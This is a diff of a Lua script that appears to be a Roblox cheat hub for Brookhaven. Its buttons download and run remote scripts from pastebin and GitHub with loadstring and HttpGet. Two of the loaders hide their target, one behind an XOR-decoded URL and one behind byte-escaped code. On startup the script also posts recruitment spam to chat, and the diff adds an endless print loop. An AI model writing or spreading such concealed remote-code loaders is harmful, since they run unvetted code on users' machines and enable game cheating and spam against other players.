@@ -24,7 +24,7 @@ local sound = Instance.new("Sound")
 sound.SoundId = SOUND_ID
 sound.Volume = 1
 sound.Looped = false
-sound.Parent = game:GetService("SoundService")  -- Better than Workspace
+sound.Parent = game:GetService("SoundService")
 
 local function playAndStopSound()
     if not sound.SoundId or sound.SoundId == "" then
@@ -124,7 +124,7 @@ local function createButton(text, callback)
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.TextScaled = true
     btn.Font = Enum.Font.GothamSemibold
-    btn.LayoutOrder = #ScrollingFrame:GetChildren()  -- Fixed
+    btn.LayoutOrder = #ScrollingFrame:GetChildren()
 
     local btnCorner = Instance.new("UICorner")
     btnCorner.CornerRadius = UDim.new(0, 8)
@@ -160,16 +160,12 @@ end
 local Button1Action  = function() safeLoad("https://pastebin.com/raw/zLspNekY") end
 local Button2Action  = function() safeLoad('https://raw.githubusercontent.com/kigredns/SanderXV4.2.2/refs/heads/main/New.lua') end
 local Button3Action  = function() 
-    -- Your obfuscated takito hub (kept as-is)
     local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;
     local function v7(v8,v9) local v10={};for v11=1,#v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11)),v1(v2(v9,1+(v11%#v9),1+(v11%#v9)+1)))%256));end return v5(v10);end
     loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\193\194\200\49\227\189\222\80\208\211\203\106\212\147\211\15\220\146\232\7\169\169\198\9","\126\177\163\187\69\134\219\167")))();
 end
 local Button4Action  = function() safeLoad("https://raw.githubusercontent.com/dreamy9x9x/darkaureus/refs/heads/main/brookhaven.lua") end
-local Button5Action  = function() 
-    local url = "https://raw.githubusercontent.com/Frost230/Embee/refs/heads/main/EmbeeScript"
-    safeLoad(url)
-end
+local Button5Action  = function() safeLoad("https://raw.githubusercontent.com/Frost230/Embee/refs/heads/main/EmbeeScript") end
 local Button6Action  = function() safeLoad("https://raw.githubusercontent.com/kayrus999/VoidHub/refs/heads/main/VoidHub.txt") end
 local Button7Action  = function() loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\103\105\116\104\117\98\46\99\111\109\47\99\111\110\116\97\116\101\115\116\101\56\47\79\97\79\97\79\97\79\97\45\69\98\69\98\69\98\69\98\47\114\97\119\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\68\114\105\112\67\108\105\101\110\116\79\98\102\46\116\120\116\34\41\41\40\41")() end
 local Button8Action  = function() safeLoad("https://raw.githubusercontent.com/bruton-lua-sources/Troling/refs/heads/main/Troll.lua") end
@@ -252,7 +248,6 @@ end)
 -- ==================== STARTUP ====================
 playAndStopSound()
 
--- Chat messages with better timing and safety
 task.spawn(function()
     task.wait(1)
     sendChatMessage("loading...")
@@ -264,4 +259,9 @@ task.spawn(function()
     sendChatMessage("JOIN KYELISZ TEAM TODAY!")
 end)
 
-print("✅ Brookhaven GUI loaded successfully!")
+task.spawn(function()
+    while true do
+        print("UsEr_UsInG_ScRiPt_DoDo")
+        task.wait(30)
+    end
+end)
